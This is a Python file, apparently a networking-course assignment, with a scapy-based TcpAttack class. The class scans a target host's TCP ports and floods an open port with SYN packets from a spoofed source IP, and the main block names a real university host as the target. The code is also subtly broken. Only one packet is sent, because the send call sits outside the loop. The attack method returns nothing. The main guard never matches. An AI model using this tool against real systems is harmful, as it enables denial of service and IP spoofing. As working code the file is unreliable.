from scapy.all import *
from scapy.layers.inet import IP, TCP, Ether, UDP, RandShort
import sys, socket
import re
import os.path

#conf.prog.wireshark = 'C:\\Users\\pjannu\\Downloads'



class TcpAttack ():
    def __init__ ( self , spoofIP :str , targetIP :str )-> None :

        self.spoofIP=spoofIP
        self.targetIP=targetIP




    
        print('Init')
    def scanTarget ( self , rangeStart :int , rangeEnd :int )-> None :

        verbosity = 0; 

        open_ports = []   


        for testport in range(rangeStart, rangeEnd+1):  

            sock = socket.socket( socket.AF_INET, socket.SOCK_STREAM )     

            sock.settimeout(0.1)                                                    
            try:         

                sock.connect( (self.targetIP, testport) )       

                open_ports.append(testport)  

                if verbosity: 
                    print(testport)  

                sys.stdout.write("%s" % testport)

                sys.stdout.flush()                                                   
            except:      

                if verbosity: print("Port closed: "), testport    

                sys.stdout.write(".")   

                sys.stdout.flush()                                                   
                                                             
        service_ports = {}  

        OUT = open("openports.txt", 'w')   

        if not open_ports:  

            print("\n\nNo open ports in the range specified\n")                          
        else:

            print ("\n\nOpen ports are:\n");  

            for k in range(0, len(open_ports)):   

                if len(service_ports) > 0:  

                    for portname in sorted(service_ports):  

                        pattern = r'^' + str(open_ports[k]) + r'/'        

                        if re.search(pattern, str(portname)):   

                            print("%d:    %s" %(open_ports[k], service_ports[portname]))

                                                                             
                else:

                    print(open_ports[k]) 

                OUT.write("%s\n" % open_ports[k])     

        OUT.close()

    def attackTarget ( self , port :int , numSyn :int )->int :


        destPort = port 
        count    = numSyn
        destIP   = self.targetIP

        srcIP    = self.spoofIP  

           

            

                                                        
        
        for i in range(count): 

            IP_header = IP(src = srcIP, dst = destIP)     

            TCP_header = TCP(flags = "S", sport = RandShort(), dport = destPort)  

            packet = IP_header / TCP_header                                          
        try: 

            send(packet)     

        except Exception as e:   

            print(e)    

        #print('Attack')



if __name__ == "__main__ ":

    print('main')

    spoofIP = '10.10.10.10'
    targetIP = 'moonshine.ecn.purdue.edu'

    rangeStart = 1000
    rangeEnd = 4000
    port = 1716
    numSyn = 100
    tcp = TcpAttack ( spoofIP , targetIP )

    tcp . scanTarget ( rangeStart , rangeEnd )
    if tcp . attackTarget ( port , numSyn ):
        print( f" Port { port } was open , and flooded with { numSyn } SYN packets ")
